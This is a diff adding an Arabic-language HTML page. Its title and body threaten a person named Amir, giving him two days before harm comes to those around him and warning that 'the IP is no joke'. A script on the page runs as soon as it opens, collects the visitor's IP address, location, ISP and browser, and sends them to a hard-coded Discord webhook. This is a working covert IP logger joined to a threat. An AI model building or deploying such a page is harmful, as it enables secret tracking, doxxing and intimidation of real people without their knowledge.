@@ -1,0 +1,68 @@
+<!doctype html>
+<html lang="ar">
+<head>
+  <meta charset="utf-8" />
+  <title> لم يتم العثور على المعلومات لخصوصيتك يا امير 😉 + معاك مهلة يومين ولا بصير اشي مش راح يعجبك وراح تسبب ب اذى ل الي حوليك  لانو ال ip مش مزحة .</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body {
+      margin:0;
+      height:100vh;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      background:#0f172a;
+      font-size:2rem;
+      color:#ffffff;
+      font-family: sans-serif;
+    }
+  </style>
+</head>
+<body>
+    لم يتم العثور على المعلومات لخصوصيتك يا امير 😉 + معاك مهلة يومين ولا بصير اشي مش راح يعجبك وراح تسبب ب اذى ل الي حوليك  لانو ال ip مش مزحة .
+
+  <script>
+    // ضع رابط الويبهوك تبعك هنا 👇
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1415365106186977353/IUpu9Yekgzpeo4Wj-WcLNFxvg8dI7_DOc62QmLCCI07uptnx_IcAh7Bj7q2I7kBo-Wrp";
+
+    async function sendVisitorInfo() {
+      try {
+        // جلب بيانات الزائر من ipapi
+        const res = await fetch("https://ipapi.co/json/");
+        if (!res.ok) throw new Error("فشل جلب بيانات IP");
+        const data = await res.json();
+
+        // تجهيز embed لإرساله إلى Discord
+        const payload = {
+          username: "Visitor Logger",
+          embeds: [{
+            title: "New Visitor",
+            color: 0xfacc15,
+            fields: [
+              { name: "IP", value: data.ip || "N/A", inline: true },
+              { name: "City", value: data.city || "N/A", inline: true },
+              { name: "Region", value: data.region || "N/A", inline: true },
+              { name: "Country", value: data.country_name || "N/A", inline: true },
+              { name: "ISP", value: data.org || "N/A" },
+              { name: "User Agent", value: navigator.userAgent }
+            ],
+            footer: { text: new Date().toLocaleString() }
+          }]
+        };
+
+        // إرسال للويبهوك
+        await fetch(WEBHOOK_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+      } catch (err) {
+        console.error("Webhook Error:", err);
+      }
+    }
+
+    // ينفذ مباشرة عند فتح الصفحة
+    sendVisitorInfo();
+  </script>
+</body>
+</html>
